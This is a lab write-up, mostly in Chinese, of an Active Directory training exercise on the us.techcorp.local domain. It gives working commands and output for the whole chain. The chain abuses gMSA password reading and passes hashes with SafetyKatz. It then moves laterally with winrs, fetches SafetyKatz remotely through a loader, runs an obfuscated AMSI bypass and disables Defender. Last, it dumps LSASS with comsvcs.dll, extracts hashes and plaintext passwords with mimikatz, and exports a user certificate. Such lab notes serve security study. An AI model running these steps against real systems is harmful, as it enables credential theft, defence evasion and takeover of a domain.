Task
•  Enumerate gMSAs in the us.techcorp.local domain.
•  Enumerate the principals that can read passwords from any gMSAs.
•  Compromise one such principal and retrieve the password from a gMSA.
•  Find if the gMSA has high privileges on any machine and extract credentials from that machine.

- 什么是gMSAs？
> 组托管服务帐户（Group Managed Service Accounts，即gMSAs）,组托管服务帐户是针对多个服务器的 MSA。 Windows 为在一组服务器上运行的服务管理服务帐户。


# Enumerate gMSAs in the us.techcorp.local domain.

使用 ADModule

这一步是枚举哪些账号的密码可以被gMSA读取，这里是jumpone
```
PS C:\ad\Tools> Get-ADServiceAccount -Filter *


DistinguishedName : CN=jumpone,CN=Managed Service Accounts,DC=us,DC=techcorp,DC=local
Enabled           : True
Name              : jumpone
ObjectClass       : msDS-GroupManagedServiceAccount
ObjectGUID        : 1ac6c58e-e81d-48a8-bc42-c768d0180603
SamAccountName    : jumpone$
SID               : S-1-5-21-210670787-2521448726-163245708-8601
UserPrincipalName :

```

# Enumerate the principals that can read passwords from any gMSAs.

这里是枚举有哪些gMSA可以读取jumpone的密码
```
PS C:\ad\Tools> Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword

PrincipalsAllowedToRetrieveManagedPassword
------------------------------------------
{CN=provisioning svc,CN=Users,DC=us,DC=techcorp,DC=local}
```
结果是：provisioning svc

# Compromise one such principal and retrieve the password from a gMSA.

根据在US-MAILMGMT收集到的provisioningsvc的哈希，pth一个shell
```
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:provisioningsvc /domain:us.techcorp.local /aes256:a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a /run:cmd.exe" "exit"
```
# Find if the gMSA has high privileges on any machine and extract credentials from that machine.

在上面步骤出来的cmd下依次执行
```
C:\Windows\system32>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
PS C:\Windows\system32>
```

使用 DSInternals module，解码password并且转成ntlm，这个哈希就是用户jumpone的

```
PS C:\Windows\system32> $Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
PS C:\Windows\system32> Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
PS C:\Windows\system32> $decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
PS C:\Windows\system32> ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
24ea295f3c05aefc8c29d07992cdcc4c
PS C:\Windows\system32>
```


使用上面得到的ntlm开启一个新的shell

```
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:jumpone /domain:us.techcorp.local /ntlm:24ea295f3c05aefc8c29d07992cdcc4c /run:powershell.exe" "exit"
```

在上面命令得到的新shell下，执行
```
PS C:\ad\Tools> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
PS C:\ad\Tools> Find-PSRemotingLocalAdminAccess -Verbose
VERBOSE: Trying to run a command parallely on provided computers list using PSRemoting .
US-Jump
```

现在可以横向到US-Jump
```
PS C:\ad\Tools> winrs -r:us-jump cmd
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\jumpone$>whoami
whoami
us\jumpone$

C:\Users\jumpone$>hostname
hostname
US-Jump
```

在学生机传文件到us-jump
```
echo F | xcopy C:\AD\Tools\Loader.exe \\us-jump\C$\Users\Public\Loader.exe /Y
```

在学生机开启一个http服务

```
python -m SimpleHTTPServer 80
```


在jump执行,发现不能运行
```
C:\Users\jumpone$>C:\Users\Public\Loader.exe -path http://192.168.100.138/SafetyKatz.exe
C:\Users\Public\Loader.exe -path http://192.168.100.138/SafetyKatz.exe
The system cannot execute the specified program.
```

转成powershell，bypass amsi也报错
```
PS C:\Users\jumpone$> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
Cannot invoke method. Method invocation is supported only on core types in this language mode.
At line:1 char:96
+ ... ,'rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly" ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : MethodInvocationNotSupportedInConstrainedLanguage
```


因为是在 Constrained Language Mode下
```
PS C:\Users\jumpone$>  $ExecutionContext.SessionState.LanguageMode
 $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
```

这可能是因为有Applocker，如果有Applocker，那可以去白名单里 执行

由于Applocker是在注册表中，如果下面cmd命令报错，表明没有Applocker

```
PS C:\Users\jumpone$> reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
ERROR: The system was unable to find the specified registry key or value.
```
报error，没有Applocker

或者使用powershell枚举Applocker
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollecti
```


wmic也不可以用
```
PS C:\Users\jumpone$> wmic
wmic
Program 'WMIC.exe' failed to run: Your organization used Device Guard to block this app. Contact your support person
for more infoAt line:1 char:1
+ wmic
+ ~~~~.
At line:1 char:1
+ wmic
+ ~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

检测WDAC
```
PS C:\Users\jumpone$> Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard


AvailableSecurityProperties                  : {1, 2, 3, 5}
CodeIntegrityPolicyEnforcementStatus         : 2     //注意这里
InstanceIdentifier                           : 4ff40742-2649-41b8-bdd1-e80fad1cce80
RequiredSecurityProperties                   : {0}
SecurityServicesConfigured                   : {0}
SecurityServicesRunning                      : {0}
UsermodeCodeIntegrityPolicyEnforcementStatus : 2    //注意这里
Version                                      : 1.0
VirtualizationBasedSecurityStatus            : 0
VirtualMachineIsolation                      : False
VirtualMachineIsolationProperties            : {0}
PSComputerName                               :
```

表明WDAC 在靶机上运行，这就是powershell处于CLM下的原因

这当前环境下，大多数进攻性的powershell脚本（包括Invoke-mimikatz）不能使用

## 离线dump出lsass里的哈希

这里使用另一种方法dump出靶机上的哈希

首先离线存储lsass.exe里的数据

查看lsass的PID
```
PS C:\Users\jumpone$> tasklist /FI "IMAGENAME eq lsass.exe"
tasklist /FI "IMAGENAME eq lsass.exe"

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
lsass.exe                      704 Services                   0     17,992 K
```

PID:704

先关闭wd
```
Set-MpPreference -DisableRealtimeMonitoring $true
```


转存lsass的数据到本地

```
C:\Users\jumpone$>rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 704 C:\Users\Public\lsass.dmp full
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 704 C:\Users\Public\lsass.dmp full

C:\Users\jumpone$>dir C:\Users\Public\lsass.dmp
dir C:\Users\Public\lsass.dmp
 Volume in drive C has no label.
 Volume Serial Number is 88AD-6C8B

 Directory of C:\Users\Public

11/01/2022  07:38 AM        47,301,370 lsass.dmp
               1 File(s)     47,301,370 bytes
               0 Dir(s)  16,105,525,248 bytes free
```

已存储到```C:\Users\Public\lsass.dmp```


**这里注意，如果有RDP可以用，在Task manager也可以手动转存lsass数据，要先关掉wd**


回到学生机，拷贝上面文件到本地

```
PS C:\Windows\system32> echo F | xcopy \\us-jump\C$\Users\Public\lsass.dmp C:\AD\Tools\lsass.dmp
Does C:\AD\Tools\lsass.dmp specify a file name
or directory name on the target
(F = file, D = directory)? F
\\us-jump\C$\Users\Public\lsass.dmp
1 File(s) copied
```

在学生机，admin权限开启mimikatz，离线dump出lsass

```
c:\AD\Tools\mimikatz_trunk\x64>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Jan  4 2020 18:59:26
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # sekurlsa::minidump C:\AD\Tools\lsass.DMP
Switch to MINIDUMP : 'C:\AD\Tools\lsass.DMP'

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::ekeys
Opening : 'C:\AD\Tools\lsass.DMP' file for minidump...

Authentication Id : 0 ; 38248 (00000000:00009568)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/25/2022 3:28:01 AM
SID               : S-1-5-90-0-1

         * Username : US-JUMP$
         * Domain   : us.techcorp.local
         * Password : @pEWg3"x<tk[Hk> E0D>`?4v`zWs$[ULrZOAL$@k:g4y@%S.`s5>z11>A>-pLnVFNT^]Bmsk/;4(gp),s'KD /^1e:>W'nz(s>gh)*. IT1V!lv-DKQf!57e
         * Key List :
           aes256_hmac       59c2c002adcc552c74f1d521194aeecbfaff2be3c7ac662b41a5982caa6e4113
           aes128_hmac       07f7247812bc59f6608f61bc06c91b29
           rc4_hmac_nt       abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old      abff11a76a2fa6de107f0ea8251005c5
           rc4_md4           abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_nt_exp   abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old_exp  abff11a76a2fa6de107f0ea8251005c5

Authentication Id : 0 ; 5845902 (00000000:0059338e)
Session           : Service from 0
User Name         : webmaster
Domain            : US
Logon Server      : US-DC
Logon Time        : 7/25/2022 4:13:57 AM
SID               : S-1-5-21-210670787-2521448726-163245708-1140

         * Username : webmaster
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0
           rc4_hmac_nt       23d6458d06b25e463b9666364fb0b29f
           rc4_hmac_old      23d6458d06b25e463b9666364fb0b29f
           rc4_md4           23d6458d06b25e463b9666364fb0b29f
           rc4_hmac_nt_exp   23d6458d06b25e463b9666364fb0b29f
           rc4_hmac_old_exp  23d6458d06b25e463b9666364fb0b29f

Authentication Id : 0 ; 78626 (00000000:00013322)
Session           : Service from 0
User Name         : appsvc
Domain            : US
Logon Server      : US-DC
Logon Time        : 7/25/2022 3:28:07 AM
SID               : S-1-5-21-210670787-2521448726-163245708-4601

         * Username : appsvc
         * Domain   : US.TECHCORP.LOCAL
         * Password : Us$rT0AccessDBwithImpersonation
         * Key List :
           aes256_hmac       b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335
           aes128_hmac       14284e4b83fdf58132aa2da8c1b49592
           rc4_hmac_nt       1d49d390ac01d568f0ee9be82bb74d4c
           rc4_hmac_old      1d49d390ac01d568f0ee9be82bb74d4c
           rc4_md4           1d49d390ac01d568f0ee9be82bb74d4c
           rc4_hmac_nt_exp   1d49d390ac01d568f0ee9be82bb74d4c
           rc4_hmac_old_exp  1d49d390ac01d568f0ee9be82bb74d4c

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : US-JUMP$
Domain            : US
Logon Server      : (null)
Logon Time        : 7/25/2022 3:27:59 AM
SID               : S-1-5-18

         * Username : us-jump$
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       88f63b9e6109aeab1c3d706a8345088659b9784614469099b65bac8fe011b277
           rc4_hmac_nt       abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old      abff11a76a2fa6de107f0ea8251005c5
           rc4_md4           abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_nt_exp   abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old_exp  abff11a76a2fa6de107f0ea8251005c5

Authentication Id : 0 ; 971064 (00000000:000ed138)
Session           : RemoteInteractive from 2
User Name         : pawadmin
Domain            : US
Logon Server      : US-DC
Logon Time        : 7/25/2022 3:44:59 AM
SID               : S-1-5-21-210670787-2521448726-163245708-1138

         * Username : pawadmin
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       a92324f21af51ea2891a24e9d5c3ae9dd2ae09b88ef6a88cb292575d16063c30
           rc4_hmac_nt       36ea28bfa97a992b5e85bd22485e8d52
           rc4_hmac_old      36ea28bfa97a992b5e85bd22485e8d52
           rc4_md4           36ea28bfa97a992b5e85bd22485e8d52
           rc4_hmac_nt_exp   36ea28bfa97a992b5e85bd22485e8d52
           rc4_hmac_old_exp  36ea28bfa97a992b5e85bd22485e8d52

Authentication Id : 0 ; 536910 (00000000:0008314e)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/25/2022 3:38:50 AM
SID               : S-1-5-90-0-2

         * Username : US-JUMP$
         * Domain   : us.techcorp.local
         * Password : @pEWg3"x<tk[Hk> E0D>`?4v`zWs$[ULrZOAL$@k:g4y@%S.`s5>z11>A>-pLnVFNT^]Bmsk/;4(gp),s'KD /^1e:>W'nz(s>gh)*. IT1V!lv-DKQf!57e
         * Key List :
           aes256_hmac       59c2c002adcc552c74f1d521194aeecbfaff2be3c7ac662b41a5982caa6e4113
           aes128_hmac       07f7247812bc59f6608f61bc06c91b29
           rc4_hmac_nt       abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old      abff11a76a2fa6de107f0ea8251005c5
           rc4_md4           abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_nt_exp   abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old_exp  abff11a76a2fa6de107f0ea8251005c5

Authentication Id : 0 ; 536890 (00000000:0008313a)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/25/2022 3:38:50 AM
SID               : S-1-5-90-0-2

         * Username : US-JUMP$
         * Domain   : us.techcorp.local
         * Password : @pEWg3"x<tk[Hk> E0D>`?4v`zWs$[ULrZOAL$@k:g4y@%S.`s5>z11>A>-pLnVFNT^]Bmsk/;4(gp),s'KD /^1e:>W'nz(s>gh)*. IT1V!lv-DKQf!57e
         * Key List :
           aes256_hmac       59c2c002adcc552c74f1d521194aeecbfaff2be3c7ac662b41a5982caa6e4113
           aes128_hmac       07f7247812bc59f6608f61bc06c91b29
           rc4_hmac_nt       abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old      abff11a76a2fa6de107f0ea8251005c5
           rc4_md4           abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_nt_exp   abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old_exp  abff11a76a2fa6de107f0ea8251005c5

Authentication Id : 0 ; 535169 (00000000:00082a81)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/25/2022 3:38:50 AM
SID               : S-1-5-96-0-2

         * Username : US-JUMP$
         * Domain   : us.techcorp.local
         * Password : @pEWg3"x<tk[Hk> E0D>`?4v`zWs$[ULrZOAL$@k:g4y@%S.`s5>z11>A>-pLnVFNT^]Bmsk/;4(gp),s'KD /^1e:>W'nz(s>gh)*. IT1V!lv-DKQf!57e
         * Key List :
           aes256_hmac       59c2c002adcc552c74f1d521194aeecbfaff2be3c7ac662b41a5982caa6e4113
           aes128_hmac       07f7247812bc59f6608f61bc06c91b29
           rc4_hmac_nt       abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old      abff11a76a2fa6de107f0ea8251005c5
           rc4_md4           abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_nt_exp   abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old_exp  abff11a76a2fa6de107f0ea8251005c5

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : US-JUMP$
Domain            : US
Logon Server      : (null)
Logon Time        : 7/25/2022 3:28:00 AM
SID               : S-1-5-20

         * Username : us-jump$
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       88f63b9e6109aeab1c3d706a8345088659b9784614469099b65bac8fe011b277
           rc4_hmac_nt       abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old      abff11a76a2fa6de107f0ea8251005c5
           rc4_md4           abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_nt_exp   abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old_exp  abff11a76a2fa6de107f0ea8251005c5

Authentication Id : 0 ; 20874 (00000000:0000518a)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/25/2022 3:28:00 AM
SID               : S-1-5-96-0-0

         * Username : US-JUMP$
         * Domain   : us.techcorp.local
         * Password : @pEWg3"x<tk[Hk> E0D>`?4v`zWs$[ULrZOAL$@k:g4y@%S.`s5>z11>A>-pLnVFNT^]Bmsk/;4(gp),s'KD /^1e:>W'nz(s>gh)*. IT1V!lv-DKQf!57e
         * Key List :
           aes256_hmac       59c2c002adcc552c74f1d521194aeecbfaff2be3c7ac662b41a5982caa6e4113
           aes128_hmac       07f7247812bc59f6608f61bc06c91b29
           rc4_hmac_nt       abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old      abff11a76a2fa6de107f0ea8251005c5
           rc4_md4           abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_nt_exp   abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old_exp  abff11a76a2fa6de107f0ea8251005c5

Authentication Id : 0 ; 971133 (00000000:000ed17d)
Session           : RemoteInteractive from 2
User Name         : pawadmin
Domain            : US
Logon Server      : US-DC
Logon Time        : 7/25/2022 3:44:59 AM
SID               : S-1-5-21-210670787-2521448726-163245708-1138

         * Username : pawadmin
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       a92324f21af51ea2891a24e9d5c3ae9dd2ae09b88ef6a88cb292575d16063c30
           rc4_hmac_nt       36ea28bfa97a992b5e85bd22485e8d52
           rc4_hmac_old      36ea28bfa97a992b5e85bd22485e8d52
           rc4_md4           36ea28bfa97a992b5e85bd22485e8d52
           rc4_hmac_nt_exp   36ea28bfa97a992b5e85bd22485e8d52
           rc4_hmac_old_exp  36ea28bfa97a992b5e85bd22485e8d52

Authentication Id : 0 ; 38267 (00000000:0000957b)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/25/2022 3:28:01 AM
SID               : S-1-5-90-0-1

         * Username : US-JUMP$
         * Domain   : us.techcorp.local
         * Password : @pEWg3"x<tk[Hk> E0D>`?4v`zWs$[ULrZOAL$@k:g4y@%S.`s5>z11>A>-pLnVFNT^]Bmsk/;4(gp),s'KD /^1e:>W'nz(s>gh)*. IT1V!lv-DKQf!57e
         * Key List :
           aes256_hmac       59c2c002adcc552c74f1d521194aeecbfaff2be3c7ac662b41a5982caa6e4113
           aes128_hmac       07f7247812bc59f6608f61bc06c91b29
           rc4_hmac_nt       abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old      abff11a76a2fa6de107f0ea8251005c5
           rc4_md4           abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_nt_exp   abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old_exp  abff11a76a2fa6de107f0ea8251005c5

Authentication Id : 0 ; 20883 (00000000:00005193)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/25/2022 3:28:00 AM
SID               : S-1-5-96-0-1

         * Username : US-JUMP$
         * Domain   : us.techcorp.local
         * Password : @pEWg3"x<tk[Hk> E0D>`?4v`zWs$[ULrZOAL$@k:g4y@%S.`s5>z11>A>-pLnVFNT^]Bmsk/;4(gp),s'KD /^1e:>W'nz(s>gh)*. IT1V!lv-DKQf!57e
         * Key List :
           aes256_hmac       59c2c002adcc552c74f1d521194aeecbfaff2be3c7ac662b41a5982caa6e4113
           aes128_hmac       07f7247812bc59f6608f61bc06c91b29
           rc4_hmac_nt       abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old      abff11a76a2fa6de107f0ea8251005c5
           rc4_md4           abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_nt_exp   abff11a76a2fa6de107f0ea8251005c5
           rc4_hmac_old_exp  abff11a76a2fa6de107f0ea8251005c5

```


## dump出机器里的证书

下面两个文件拷贝到us-jump
```
PS C:\Windows\system32> ls \\us-jump\C$


    Directory: \\us-jump\C$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/1/2022   7:42 AM                AD
d-----        12/7/2020   5:32 AM                PerfLogs
d-r---        7/20/2019   3:21 AM                Program Files
d-----         7/3/2019  10:00 AM                Program Files (x86)
d-----        11/1/2022   2:48 AM                Transcripts
d-r---        11/5/2021   4:54 AM                Users
d-----        5/22/2022   3:46 AM                Windows


PS C:\Windows\system32> echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\us-jump\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y
Does \\us-jump\C$\Users\Public\RunWithRegistryNonAdmin.bat specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
1 File(s) copied
PS C:\Windows\system32> echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\us-jump\C$\Users\Public\InShellProf.dll /Y
Does \\us-jump\C$\Users\Public\InShellProf.dll specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\InviShell\InShellProf.dll
1 File(s) copied
```

执行
```
C:\Users\jumpone$>C:\Users\Public\RunWithRegistryNonAdmin.bat
<skip>
..
C:\Users\jumpone$>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\jumpone$>
```

下面路径查看本地的证书
```
PS C:\Users\jumpone$> ls cert:\LocalMachine\My
ls cert:\LocalMachine\My


   PSParentPath: Microsoft.PowerShell.Security\Certificate::LocalMachine\My

Thumbprint                                Subject
----------                                -------
BAD78F43BB4CB13C4843E49B51AA051530FFBBDB  E=pawadmin@techcorp.local, CN=pawadmin, CN=Users, DC=us, DC=techcorp, DC=l...

```

有一个用户pawadmin的证书存储在此

导出这个证书

```
PS C:\Users\jumpone$> ls cert:\LocalMachine\My\BAD78F43BB4CB13C4843E49B51AA051530FFBBDB | Export-PfxCertificate -FilePath C:\Users\Public\pawadmin.pfx -Password (ConvertTo-SecureString -String 'SecretPass@123' -Force -AsPlainText)
ls cert:\LocalMachine\My\BAD78F43BB4CB13C4843E49B51AA051530FFBBDB | Export-PfxCertificate -FilePath C:\Users\Public\pawadmin.pfx -Password (ConvertTo-SecureString -String 'SecretPass@123' -Force -AsPlainText)


    Directory: C:\Users\Public


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/1/2022   8:01 AM           4713 pawadmin.pfx
```

手册里的这几行操作我不明白是为什么
```
C:\Users\jumpone$>set COR_ENABLE_PROFILING=
C:\Users\jumpone$>set COR_PROFILER=
C:\Users\jumpone$>REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
The operation completed successfully.
```


在学生机，把证书拷贝到本地
```
PS C:\Windows\system32> echo F | xcopy \\us-jump\C$\Users\Public\pawadmin.pfx C:\AD\Tools\pawadmin.pfx
Does C:\AD\Tools\pawadmin.pfx specify a file name
or directory name on the target
(F = file, D = directory)? F
\\us-jump\C$\Users\Public\pawadmin.pfx
1 File(s) copied
PS C:\Windows\system32> ls  C:\AD\Tools\pawadmin.pfx


    Directory: C:\AD\Tools


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/1/2022   8:01 AM           4713 pawadmin.pfx
```